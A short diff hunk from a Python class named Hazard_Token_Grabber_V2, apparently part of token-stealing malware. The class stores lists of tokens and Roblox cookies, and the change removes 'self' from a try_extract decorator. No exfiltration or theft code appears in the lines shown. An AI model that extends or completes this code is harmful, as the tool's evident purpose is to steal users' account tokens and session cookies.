@@ -89,7 +89,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.tokens = []
         self.robloxcookies = []
 
-    def try_extract(self, func):
+    def try_extract(func):
         def wrapper(*args, **kwargs):
             try:
                 func(*args, **kwargs)
